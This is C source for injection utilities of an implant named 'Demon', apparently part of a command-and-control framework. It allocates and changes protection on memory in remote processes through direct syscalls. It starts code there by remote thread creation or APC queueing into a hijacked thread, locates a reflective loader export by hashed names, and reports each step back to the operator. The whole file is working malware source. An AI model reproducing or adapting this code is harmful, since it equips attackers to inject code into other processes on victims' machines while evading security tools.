#include <Demon.h>

#include <Core/MiniStd.h>
#include <Core/Package.h>
#include <Inject/InjectUtil.h>

#ifndef _WIN32
typedef ULONG NTSTATUS;
#endif

LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD Protect )
{
    PPACKAGE Package  = PackageCreate( DEMON_INFO );
    PVOID    Memory   = NULL;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
    switch ( MemMethode )
    {
        case DX_MEM_DEFAULT:
        {
            PUTS( "DX_MEM_DEFAULT" )

            Memory = Instance.Config.Memory.Alloc != DX_MEM_DEFAULT ?
                    MemoryAlloc( Instance.Config.Memory.Alloc, hProcess, MemSize, Protect ) :  // if the config memory alloc ain't default then use that
                    MemoryAlloc( DX_MEM_SYSCALL, hProcess, MemSize, Protect );  // if it is default then simply choose Native/Syscall

            return Memory;
        }

        case DX_MEM_WIN32:
        {
            PRINTF( "VirtualAllocEx( %x, NULL, %ld, %ld, %ld ) => ", hProcess, MemSize, MEM_RESERVE | MEM_COMMIT, Protect );
            Memory = Instance.Win32.VirtualAllocEx( hProcess, NULL, MemSize, MEM_RESERVE | MEM_COMMIT, Protect );
#ifdef DEBUG
            printf( "%p\n", Memory );
#endif
            break;
        }

        case DX_MEM_SYSCALL:
        {
            PRINTF( "NtAllocateVirtualMemory( %x, %p, %d, %p [%d], %d, %x ) => ", hProcess, &Memory, 0, &MemSize, MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
            NtStatus = Instance.Syscall.NtAllocateVirtualMemory( hProcess, &Memory, 0, &MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
#ifdef DEBUG
            printf( "%x\n", NtStatus );
#endif
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PRINTF( "[-] NtAllocateVirtualMemory: Failed:[%lx]\n", NtStatus )
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                return NULL;
            }

            PRINTF( "Memory:[%p] MemSize:[%d]\n", Memory, MemSize );

            break;
        }

        default:
        {
            return NULL;
        }
    }

    if ( Memory && Instance.Config.Implant.Verbose )
    {
        PUTS( "Memory" )
        PackageAddInt32( Package, Memory );
        PackageAddInt32( Package, MemSize );
        PackageAddInt32( Package, Protect );
        PackageTransmit( Package, NULL, NULL );
    }

    return Memory;
}

BOOL MemoryProtect( DX_MEMORY MemMethode, HANDLE hProcess, LPVOID Memory, SIZE_T MemSize, DWORD Protect )
{
    PPACKAGE  Package    = PackageCreate( DEMON_INFO );
    NTSTATUS  NtStatus   = STATUS_SUCCESS;
    DWORD     OldProtect = 0;
    BOOL      Success    = FALSE;

    PackageAddInt32( Package, DEMON_INFO_MEM_PROTECT );
    switch ( MemMethode )
    {
        case DX_MEM_WIN32:
        {
            Success = Instance.Win32.VirtualProtectEx( hProcess, Memory, MemSize, Protect, &OldProtect );
        }
        case DX_MEM_SYSCALL:
        {
            NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &Memory, &MemSize, Protect, &OldProtect );

            if ( ! NT_SUCCESS( NtStatus ) )
            {
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                Success = FALSE;
            }
            else
                Success = TRUE;

            break;
        }
        default:
        {
            Success = FALSE;
        }
    }

    if ( Success && Instance.Config.Implant.Verbose )
    {
        PUTS( "Memory Protection" )
        PackageAddInt32( Package, Memory );
        PackageAddInt32( Package, MemSize );
        PackageAddInt32( Package, OldProtect );
        PackageAddInt32( Package, Protect );
        PackageTransmit( Package, NULL, NULL );
    }

    return Success;
}

BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryPoint, PINJECTION_CTX ctx )
{
    PPACKAGE Package  = PackageCreate( DEMON_INFO );
    NTSTATUS NtStatus = STATUS_SUCCESS;
    BOOL     Success  = FALSE;

    PackageAddInt32( Package, DEMON_INFO_MEM_EXEC );
    switch ( CreateThreadMethode )
    {
        case DX_THREAD_DEFAULT:
        {
            PUTS( "DX_MEM_DEFAULT" )

            Success = Instance.Config.Memory.Execute != DX_THREAD_DEFAULT ?
                      ThreadCreate( Instance.Config.Memory.Execute, hProcess, EntryPoint, ctx ) :  // if the config memory execute ain't default then use that
                      ThreadCreate( DX_THREAD_SYSCALL, hProcess, EntryPoint, ctx );  // if it is default then simply choose Native/Syscall

            return Success;
        }
        case DX_THREAD_WIN32:
        {
            PUTS( "DX_THREAD_WIN32" );
            Success = Instance.Win32.CreateRemoteThread( hProcess, NULL, 0, EntryPoint, ctx->Parameter, NULL, &ctx->ThreadID );
            break;
        }

        case DX_THREAD_SYSCALL:
        {
            PUTS( "DX_THREAD_SYSCALL" );

            NT_PROC_THREAD_ATTRIBUTE_LIST ThreadAttr = { 0 };
            CLIENT_ID                     ClientId   = { 0 };

            MemSet( &ThreadAttr, 0, sizeof( PROC_THREAD_ATTRIBUTE_NUM ) );
            MemSet( &ClientId, 0, sizeof( CLIENT_ID ) );

            ThreadAttr.Entry.Attribute  = ProcThreadAttributeValue( PsAttributeClientId, TRUE, FALSE, FALSE );
            ThreadAttr.Entry.Size       = sizeof( CLIENT_ID );
            ThreadAttr.Entry.pValue     = &ClientId;
            ThreadAttr.Length           = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );

            NtStatus = Instance.Syscall.NtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, EntryPoint, ctx->Parameter, FALSE, NULL, NULL, NULL, &ThreadAttr );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "[-] NtCreateThreadEx: failed" )
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                return FALSE;
            }

            PRINTF( "Thread id : %d\n", ClientId.UniqueThread );

            ctx->ThreadID = ClientId.UniqueThread;
            Success       = TRUE;

            break;
        }


        case DX_THREAD_SYSAPC:
        {
            PUTS( "DX_THREAD_SYSAPC" );

            HANDLE          hSnapshot   = { 0 };
            DWORD           threadId    = 0;
            THREADENTRY32   threadEntry = { sizeof( THREADENTRY32 ) };
            BOOL            bResult     = FALSE;

            if ( ! ctx->hThread )
            {
                PUTS( "Search for random thread" )
                // TODO: change to Syscall

                hSnapshot = Instance.Win32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
                bResult   = Instance.Win32.Thread32First( hSnapshot, &threadEntry );
                while ( bResult )
                {
                    bResult = Instance.Win32.Thread32Next( hSnapshot, &threadEntry );
                    if ( bResult )
                    {
                        if ( threadEntry.th32OwnerProcessID == ctx->ProcessID )
                        {
                            threadId = threadEntry.th32ThreadID;

                            CLIENT_ID           ProcClientID        = { 0 };
                            OBJECT_ATTRIBUTES   ObjectAttributes    = { 0 };

                            // init the attributes
                            InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );

                            // set the correct pid and tid
                            ProcClientID.UniqueProcess = ( HANDLE ) ctx->ProcessID;
                            ProcClientID.UniqueThread  = ( HANDLE ) threadId;

                            Instance.Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );

                            break;
                        }
                    }
                }

                Instance.Win32.NtClose( hSnapshot );
            }

            if ( ctx->SuspendAwake )
            {
                NtStatus = Instance.Syscall.NtSuspendThread( ctx->hThread, NULL );
                if ( ! NT_SUCCESS( NtStatus ) )
                {
                    PUTS( "[-] NtSuspendThread: Failed" )
                    Success = FALSE;
                }
            }

            NtStatus = Instance.Syscall.NtQueueApcThread( ctx->hThread, EntryPoint, ctx->Parameter, NULL, NULL );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "[-] NtQueueApcThread: Failed" )
                Success = FALSE;
            } else
                Success = TRUE;

            // Alert the thread. trigger execution
            if ( ctx->SuspendAwake )
            {
                NtStatus = Instance.Syscall.NtAlertResumeThread( ctx->hThread, NULL );
                if ( ! NT_SUCCESS( NtStatus ) )
                {
                    PUTS( "[-] NtAlertResumeThread: Failed" );
                    NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                    Success = FALSE;
                } else PUTS( "[+] NtAlertResumeThread: Success" );

                Success = TRUE;
            }

            break;
        }

        default:
        {
            return FALSE;
        }
    }

    if ( Success )
    {
        if ( Instance.Config.Implant.Verbose )
        {
            PUTS( "Success" )
            PackageAddInt32( Package, EntryPoint );
            PackageAddInt32( Package, ctx->ThreadID );
            PackageTransmit( Package, NULL, NULL );
        }

        // Only add to the job if it's running in the current process/implant.
        if ( hProcess == NtCurrentProcess() )
        {
            if ( ctx->ThreadID != 0 )
            {
                JobAdd( ctx->ThreadID, JOB_TYPE_THREAD, JOB_STATE_RUNNING, ctx->hThread, NULL );
            }
        }
    }

    return Success;
}

DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
{
    PIMAGE_SECTION_HEADER   ImageSectionHeader;
    PIMAGE_NT_HEADERS       ImageNtHeaders;

    ImageNtHeaders     = RVA( PIMAGE_NT_HEADERS, uiBaseAddress, ( ( PIMAGE_DOS_HEADER ) uiBaseAddress )->e_lfanew );
    ImageSectionHeader = RVA( PIMAGE_SECTION_HEADER, &ImageNtHeaders->OptionalHeader, ImageNtHeaders->FileHeader.SizeOfOptionalHeader );

    if ( dwRva < ImageSectionHeader[ 0 ].PointerToRawData )
        return dwRva;

    for ( WORD wIndex = 0; wIndex < ImageNtHeaders->FileHeader.NumberOfSections; wIndex++ )
    {
        DWORD VirtualAddress = ImageSectionHeader[ wIndex ].VirtualAddress;

        if ( dwRva >= VirtualAddress && dwRva < ( VirtualAddress + ImageSectionHeader[ wIndex ].SizeOfRawData ) )
        {
            return ( dwRva - VirtualAddress + ImageSectionHeader[ wIndex ].PointerToRawData );
        }
    }

    return 0;
}

DWORD GetReflectiveLoaderOffset( PVOID ReflectiveLdrAddr )
{
    PIMAGE_NT_HEADERS       NtHeaders           = NULL;
    PIMAGE_EXPORT_DIRECTORY ExportDir           = NULL;
    UINT_PTR                AddrOfNames         = NULL;
    UINT_PTR                AddrOfFunctions     = NULL;
    UINT_PTR                AddrOfNameOrdinals  = NULL;
    DWORD                   FunctionCounter     = NULL;
    PCHAR                   FunctionName        = NULL;

    NtHeaders           = RVA( PIMAGE_NT_HEADERS, ReflectiveLdrAddr, ( ( PIMAGE_DOS_HEADER ) ReflectiveLdrAddr )->e_lfanew );
    ExportDir           = ReflectiveLdrAddr + Rva2Offset( NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress, ReflectiveLdrAddr );
    AddrOfNames         = ReflectiveLdrAddr + Rva2Offset( ExportDir->AddressOfNames, ReflectiveLdrAddr );
    AddrOfNameOrdinals  = ReflectiveLdrAddr + Rva2Offset( ExportDir->AddressOfNameOrdinals, ReflectiveLdrAddr );
    FunctionCounter     = ExportDir->NumberOfNames;

    while ( FunctionCounter-- )
    {
        FunctionName = ( PCHAR )( ReflectiveLdrAddr + Rva2Offset( DEREF_32( AddrOfNames ), ReflectiveLdrAddr ) );
        if ( HashStringA( FunctionName ) == 0xa6caa1c5 || HashStringA( FunctionName ) == 0xffe885ef )
        {
            PRINTF( "FunctionName => %s\n", FunctionName );
            AddrOfFunctions =   ReflectiveLdrAddr + Rva2Offset( ExportDir->AddressOfFunctions, ReflectiveLdrAddr );
            AddrOfFunctions +=  ( DEREF_16( AddrOfNameOrdinals ) * sizeof( DWORD ) );

            return Rva2Offset( DEREF_32( AddrOfFunctions ), ReflectiveLdrAddr );
        }

        AddrOfNames        += sizeof( DWORD );
        AddrOfNameOrdinals += sizeof( WORD );
    }

    return 0;
}

#ifdef _WIN64

DWORD GetPeArch( PVOID PeBytes )
{
    PIMAGE_NT_HEADERS NtHeader = NULL;
    DWORD             DllArch  = PROCESS_ARCH_UNKNOWN;

    if( ! PeBytes )
        return DllArch;

    NtHeader = ( PIMAGE_NT_HEADERS ) ( ( ( UINT_PTR ) PeBytes ) + ( ( PIMAGE_DOS_HEADER ) PeBytes )->e_lfanew );

    if ( NtHeader->OptionalHeader.Magic == 0x010B )
        DllArch = PROCESS_ARCH_X86;

    else if ( NtHeader->OptionalHeader.Magic == 0x020B )
        DllArch = PROCESS_ARCH_X64;

    return DllArch;
}

#endif /* _WIN64 */